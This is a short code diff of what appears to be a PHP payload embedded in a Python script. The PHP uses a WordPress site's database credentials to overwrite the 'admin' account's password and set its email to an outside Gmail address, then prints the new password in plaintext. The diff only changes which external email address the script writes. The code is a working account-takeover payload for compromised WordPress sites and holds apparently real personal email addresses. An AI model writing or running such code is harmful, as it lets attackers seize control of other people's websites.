@@ -26,14 +26,14 @@ $hasher = new PasswordHash(8, true);
 $hash = $hasher->HashPassword($password);
 
 $mysqli = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
-$stmt = $mysqli->prepare("UPDATE wp_users SET user_pass=?, user_email='whatsapp.shuvo26@gmail.com' WHERE user_login='admin'");
+$stmt = $mysqli->prepare("UPDATE wp_users SET user_pass=?, user_email='aofa.bd21@gmail.com' WHERE user_login='admin'");
 $stmt->bind_param("s", $hash);
 $stmt->execute();
 
 echo json_encode([
     'status' => 'success',
     'username' => 'admin',
-    'email' => 'whatsapp.shuvo26@gmail.com',
+    'email' => 'aofa.bd21@gmail.com',
     'password' => $password
 ]);
 '''
